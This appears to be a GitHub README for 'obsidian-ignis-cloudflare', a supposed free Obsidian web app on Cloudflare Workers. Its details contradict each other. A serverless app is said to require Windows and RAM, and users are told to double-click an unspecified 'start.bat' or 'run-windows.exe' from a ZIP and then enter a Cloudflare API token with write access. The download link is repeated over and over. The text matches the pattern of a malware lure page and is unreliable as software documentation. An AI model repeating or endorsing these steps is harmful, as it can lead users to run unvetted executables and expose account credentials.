<h1>☁️ obsidian-ignis-cloudflare - Self-Hosted Obsidian Web App for Free</h1>

[<img src="https://img.shields.io/badge/Download-obsidian--ignis--cloudflare-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">](https://github.com/priva5924/obsidian-ignis-cloudflare)

Welcome! This guide will help you download and start using **obsidian-ignis-cloudflare** on your Windows computer. This is a 100% free, self-hosted web version of your Obsidian notes that runs on Cloudflare's serverless platform – meaning zero server costs and zero maintenance for you. You don't need any programming knowledge to get started.

---

## 🧭 What Is This App?

obsidian-ignis-cloudflare is a personal knowledge management tool. It lets you access and edit your Markdown notes from anywhere using a web browser. Think of it as your private Obsidian cloud – but you control everything. It uses Cloudflare Workers, R2 storage, and KV to store and serve your notes securely.

### ✨ Key Features

- **Free Forever** – No subscription fees, no hidden costs.
- **Zero Maintenance** – Cloudflare handles all the technical stuff automatically.
- **Markdown Support** – Write and edit notes using simple Markdown formatting.
- **Self-Hosted** – Your data stays on your Cloudflare account, not on third-party servers.
- **Web-Based** – Access your notes from any device with a browser.
- **Secure** – Your notes are private and encrypted in transit.

---

## 🛠️ System Requirements

Before you begin, make sure your Windows computer meets these simple requirements:

- **Operating System:** Windows 10 or Windows 11
- **Internet Connection:** Required for initial setup and note syncing
- **Browser:** Any modern browser (Chrome, Edge, Firefox, or Safari)
- **Hard Drive Space:** Less than 100 MB needed
- **Memory:** 2 GB RAM or more is recommended

---

## 📥 Download Instructions

Visit the link below to download the application package:

**[📦 Click Here to Download obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**

This link takes you to the main project page. The download file is a standard ZIP archive that contains everything you need to run the application on your Windows PC.

---

## 📂 Installation Guide (Windows)

Follow these step-by-step instructions carefully. It should take less than 10 minutes total.

### Step 1: Download the ZIP File

1. Open your web browser (Edge, Chrome, or Firefox)
2. Go to the download page: **[https://github.com/priva5924/obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**
3. Look for a green button that says **"Code"** – click it
4. Select **"Download ZIP"** from the dropdown menu
5. Your browser will save a file called `obsidian-ignis-cloudflare-main.zip` to your **Downloads** folder

### Step 2: Extract the ZIP File

1. Open your **Downloads** folder (press `Windows + E`, then click "Downloads" on the left)
2. Locate the file `obsidian-ignis-cloudflare-main.zip`
3. Right-click on the ZIP file
4. Select **"Extract All..."** from the context menu
5. A dialog box will appear – click **"Extract"**
6. Windows will create a new folder called `obsidian-ignis-cloudflare-main`

### Step 3: Run the Application

1. Open the extracted folder `obsidian-ignis-cloudflare-main`
2. Look for a file named `start.bat` or `run-windows.exe` (you'll see only one)
3. **Double-click** that file to launch the application
4. A black terminal window may open briefly – this is normal
5. Your default web browser will open automatically to `http://localhost:3000`
6. You should see the obsidian-ignis-cloudflare login screen

---

## 🚀 First-Time Setup

When you open the app for the first time, you'll need to complete a quick setup:

1. **Create an Admin Password** – Choose a strong password to protect your notes
2. **Connect to Cloudflare** – The app will guide you to create a free Cloudflare account (if you don't have one) and generate an API token
3. **Verify Storage** – The app will check that your R2 and KV storage are configured properly
4. **Done!** – Once configured, you can start creating and managing your notes

### 🌐 Accessing Your Notes Anywhere

After initial setup, you can access your notes from any device:

- Use your Cloudflare Workers subdomain (e.g., `your-name.workers.dev`)
- Or use your custom domain if you connect one
- Login with your admin password to view and edit notes

---

## 📝 Using the App

### Creating a Note

1. Click the **"+"** button in the top-right corner
2. Enter a title for your note
3. Start typing in Markdown format
4. Your changes save automatically every few seconds

### Organizing Notes

- **Folders:** Create folders from the sidebar to keep notes organized
- **Tags:** Add `#tags` to your notes for easy searching
- **Search:** Use the search bar to find anything instantly

### Syncing Content

- All changes sync to Cloudflare immediately
- Your notes are available on any device with internet access
- No manual save button needed – everything is real-time

---

## ⚙️ Configuration Tips

For advanced users who want to customize their setup:

- **Custom Domain:** Connect your own domain in Cloudflare Workers settings
- **Multiple Users:** Edit the config file to allow different usernames
- **Theme Switching:** Use the settings panel to choose light/dark mode

These options are optional – the default settings work great for most people.

---

## 🎯 Troubleshooting

If something goes wrong, try these common fixes:

### The App Doesn't Open

- Make sure you extracted the ZIP completely
- Close any other programs that use port 3000
- Restart your computer and try again

### Can't Connect to Cloudflare

- Verify your internet connection is stable
- Double-check your API token permissions (should include Read/Write for R2 and KV)
- Ensure you've created an R2 bucket named `ignis-notes` in your Cloudflare dashboard

### Lost Your Password

- The password is stored locally in the config file
- Delete the `config.json` file and restart the app to reset it

---

## 📞 Need Help?

If you have questions or encounter issues:

- **GitHub Issues:** Report bugs at the project repository
- **Documentation:** Check the `/docs` folder in the extracted package
- **Community Forums:** Search "obsidian-ignis-cloudflare" on Cloudflare community

---

## 🔒 Privacy & Security

Your notes are stored on your Cloudflare account, which provides:

- **Encryption in transit** (HTTPS)
- **No tracking or analytics** (the app collects nothing)
- **Data isolation** – only your API token can access your storage

You maintain full control over your data at all times.

---

## 📋 Final Checklist

Before you go, make sure you:

- [ ] Downloaded the ZIP file from the link
- [ ] Extracted it to a folder you can remember
- [ ] Ran the startup file (`start.bat` or `run-windows.exe`)
- [ ] Completed first-time setup with your Cloudflare account
- [ ] Created your first test note

---

## 🎉 That's It!

You're now ready to use obsidian-ignis-cloudflare. Enjoy the freedom of a self-hosted, cost-free note-taking system that you fully own. Happy writing!

**[📥 Download Again If Needed](https://github.com/priva5924/obsidian-ignis-cloudflare)**